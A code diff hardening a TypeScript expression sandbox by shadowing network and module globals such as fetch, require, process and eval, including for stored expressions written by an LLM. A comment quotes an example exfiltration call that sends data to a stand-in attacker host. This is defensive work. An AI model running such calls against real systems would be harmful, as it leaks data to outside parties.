@@ -191,10 +191,59 @@ export function validateExpression(expression: string): void {
 }
 
 /**
+ * Globals shadowed to `undefined` inside every evaluated body.
+ *
+ * The AST gate above stops a `constructor`-walk escape to Node internals, but it
+ * is a DENYLIST of names — and it never blocked the network sinks that Node 18+
+ * exposes as plain globals. `return fetch('https://evil.example/?x=' + json.k)`
+ * contains no banned identifier, so it parsed clean and then ran server-side
+ * from the trusted process, outside the SSRF guard entirely.
+ *
+ * That matters most for expressions an LLM authors and we STORE: an
+ * `api_integrations` output expression (see src/lib/apis/integrations.ts) is
+ * written by the model and re-evaluated on every call. Shadowing is a whitelist-
+ * shaped defence — the names are bound as parameters, so they are `undefined`
+ * in the body no matter how they are spelled or computed.
+ *
+ * Deliberately NOT shadowed: Math, JSON, Date, Number, String, Array, Object,
+ * parseInt/parseFloat, isNaN — the arithmetic and formatting that legitimate
+ * conditional/transform/output expressions are built from.
+ */
+const SHADOWED_GLOBALS = [
+  'fetch',
+  'XMLHttpRequest',
+  'WebSocket',
+  'EventSource',
+  'Request',
+  'Response',
+  'navigator',
+  'require',
+  'process',
+  'globalThis',
+  'global',
+  'Buffer',
+  'module',
+  'exports',
+  'eval',
+  'Function',
+  'import',
+] as const;
+
+/**
  * Build a Function from an expression after safety validation.
- * The returned function receives the listed `argNames` as parameters.
+ * The returned function receives the listed `argNames` as parameters; the
+ * network/module globals in SHADOWED_GLOBALS are additionally bound to
+ * `undefined` so an evaluated body cannot reach them.
  */
 export function safeFunction(argNames: string[], body: string): Function {
   validateExpression(body);
-  return new Function(...argNames, body);
+  // `import` is a reserved word and cannot be a parameter name; the AST gate
+  // already bans it as an identifier/literal, so skip it here.
+  const shadows = SHADOWED_GLOBALS.filter((n) => n !== 'import' && !argNames.includes(n));
+  const fn = new Function(...argNames, ...shadows, body) as (...args: unknown[]) => unknown;
+  // Wrap so callers keep calling with only their own args — the shadow
+  // parameters are left unpassed and are therefore `undefined`.
+  return function (this: unknown, ...args: unknown[]) {
+    return fn.apply(this, args.slice(0, argNames.length));
+  };
 }
